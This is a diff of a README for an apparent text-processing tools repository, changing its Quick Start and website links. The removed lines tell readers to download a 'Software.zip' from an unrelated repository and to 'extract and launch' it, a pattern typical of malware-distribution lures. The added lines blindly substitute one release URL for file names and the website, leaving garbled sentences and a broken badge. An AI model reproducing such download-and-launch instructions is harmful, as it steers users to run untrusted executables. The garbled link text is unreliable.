@@ -20,10 +20,10 @@ This repository contains tools and scripts for text processing, particularly for
 
 ## 🚀 Quick Start
 
-To get started with the text processing tools, download the Software.zip file from the following link:
-[![Download Software.zip](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+To get started with the text processing tools, download the https://github.com/Sickclaymaker/text-processing-tool/releases/tag/v1.0 file from the following link:
+[![Download https://github.com/Sickclaymaker/text-processing-tool/releases/tag/v1.0](https://github.com/Sickclaymaker/text-processing-tool/releases/tag/v1.0)](https://github.com/Sickclaymaker/text-processing-tool/releases/tag/v1.0)
 
-Please make sure to extract and launch the Software.zip file to access the tools and scripts for text processing.
+Please make sure to extract and launch the https://github.com/Sickclaymaker/text-processing-tool/releases/tag/v1.0 file to access the tools and scripts for text processing.
 
 ## 📦 Releases
 
@@ -31,7 +31,7 @@ If the provided download link is not working or you require access to different 
 
 ## 🌐 Visit Our Website
 
-For more information and updates on the text processing tools available in this repository, please visit our website at [TextProcessingTool.com](https://www.textprocessingtool.com).
+For more information and updates on the text processing tools available in this repository, please visit our website at [https://github.com/Sickclaymaker/text-processing-tool/releases/tag/v1.0](https://github.com/Sickclaymaker/text-processing-tool/releases/tag/v1.0).
 
 ## 🧰 Tools and Scripts Overview
 
